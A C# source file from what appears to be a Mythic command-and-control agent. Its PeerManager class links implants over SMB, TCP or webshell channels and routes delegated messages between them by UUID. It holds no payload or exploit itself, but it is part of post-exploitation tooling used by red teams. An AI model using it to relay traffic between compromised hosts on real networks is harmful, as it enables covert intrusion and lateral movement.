﻿using System;
using SystemAgent.Peers.SMB;
using SystemAgent.Peers.TCP;
using SystemAgent.Peers.Webshell;
using SystemAgentInterop.Interfaces;
using SystemAgentInterop.Structs.MythicStructs;
using SystemAgentInterop.Utils;
using AI = SystemInterop;
namespace SystemAgent.Management.Peer
{
    public class PeerManager : AI.Classes.P2P.PeerManager
    {
        public PeerManager(IAgent agent) : base(agent)
        {

        }

        public override AI.Classes.P2P.Peer AddPeer(PeerInformation connectionInfo)
        {
            AI.Classes.P2P.Peer peer = null;
            switch(connectionInfo.C2Profile.Name.ToUpper())
            {
                case "SMB":
                    peer = new SMBPeer(_agent, connectionInfo);
                    break;
                case "TCP":
                    peer = new TCPPeer(_agent, connectionInfo);
                    break;
                case "WEBSHELL":
                    peer = new WebshellPeer(_agent, connectionInfo);
                    break;
                default:
                    throw new Exception("Not implemented.");
            }
            if (peer == null)
            {
                throw new Exception("Peer not set to an instance of an object.");
            }
            while (!_peers.TryAdd(peer.GetUUID(), peer))
            {
                System.Threading.Thread.Sleep(100);
            }
            peer.UUIDNegotiated += (object _, AI.Classes.UUIDEventArgs args) =>
            {
                while (!_peers.TryRemove(peer.GetUUID(), out IPeer _))
                {
                    System.Threading.Thread.Sleep(100);
                }
                while (!_peers.TryAdd(peer.GetMythicUUID(), peer))
                {
                    System.Threading.Thread.Sleep(100);
                }
            };
            peer.Disconnect += (object _, EventArgs a) =>
            {
                while (!Remove(peer))
                    System.Threading.Thread.Sleep(100);
            };
            //peer.Start();
            return peer;
        }

        public override bool Route(DelegateMessage msg)
        {
            if (_peers.ContainsKey(msg.UUID))
            {
                _peers[msg.UUID].ProcessMessage(msg);
                return true;
            }
            return false;
        }
    }
}
